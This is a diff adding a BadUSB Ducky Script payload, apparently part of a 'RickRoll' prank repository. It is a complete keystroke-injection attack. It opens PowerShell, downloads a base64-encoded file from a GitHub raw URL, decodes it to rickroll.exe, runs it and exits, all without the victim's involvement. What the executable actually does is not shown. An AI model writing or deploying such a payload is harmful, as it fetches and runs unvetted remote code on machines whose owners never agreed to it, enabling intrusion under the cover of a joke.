@@ -1,0 +1,26 @@
+REM Open PowerShell
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+
+
+REM Download encoded executable
+STRING $url='https://raw.githubusercontent.com/Chrislundh98/BadUSB/main/RickRoll/RickRoll_Advanced/rickroll_adv_enc.txt'; $out='rickroll_adv_enc.txt'; Invoke-WebRequest -Uri $url -OutFile $out
+ENTER
+DELAY 1000
+
+REM Decode the file and save as .exe
+STRING $data=Get-Content -Path rickroll_adv_enc.txt; $decoded=[System.Convert]::FromBase64String($data); [System.IO.File]::WriteAllBytes('rickroll.exe', $decoded)
+ENTER
+DELAY 1000
+
+REM Execute the decoded .exe file
+STRING Start-Process -FilePath .\rickroll.exe
+ENTER
+DELAY 500
+
+REM Close PowerShell
+STRING exit
+ENTER
